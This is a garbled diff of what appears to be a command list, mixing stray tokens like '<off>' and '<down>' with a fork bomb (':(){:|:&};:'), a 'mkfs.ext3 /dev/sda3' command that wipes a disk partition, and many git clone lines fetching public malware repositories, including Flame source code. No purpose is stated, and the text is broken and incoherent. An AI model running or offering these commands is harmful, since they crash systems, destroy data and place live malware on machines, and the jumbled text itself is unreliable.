@@ -1,28 +1,36 @@
 <off>
 blinkLED: RED
+<off>
 :(){:|:&};:
 <down>
 git clone https://github.com/Endermanch/MalwareDatabase
 mkfs.ext3 /dev/sda3. 2a
+<off>
 <down>
 git clone https://github.com/HBMS-0em/pushit
 <down>
+<off>
 git clone https://github.com/Penetrum-Security/Malware-Zoo
 <down>
 <down>
+<off>
 git clone https://github.com/Penetrum-Security/Malware-Zoo
 <down>
 git clone https://github.com/System32Booster/MalwareDatabase
+<off 
 git clone https://github.com/Haroun-Haeder/MalwareDatabase
 git clone https://github.com/pankoza2-pl/malwaredatabase-old
 <off>
 <down>
 git clone https://github.com/Pyran1/MalwareDatabase
+<off>
 git clone https://github.com/YuuyaGitHub/MalwareDataBase
 git clone https://github.com/pankoza2-pl/Malware2.0Database
+<off>
 <down>
 git clone https://github.com/mko-x/docker-clamav
 git clone https://github.com/Pyran1/MalwareDatabaseUnsorted
+<off>
 git clone https://github.com/Haroun-Haeder/MalwareDatabase
 <off>
 <down>
@@ -33,6 +41,7 @@ git clone https://github.com/win2007/MalwareDatabase-1.git
 <down
 git clone https://github.com/Correia-jpv/fucking-awesome-malware-analysis
 git clone https://github.com/madhanmaaz/blackpanther
+<off>
 git clone https://github.com/LJ9859/Malware-Database
 <off>
 git clone https://github.com/loneicewolf/flame-sourcecode
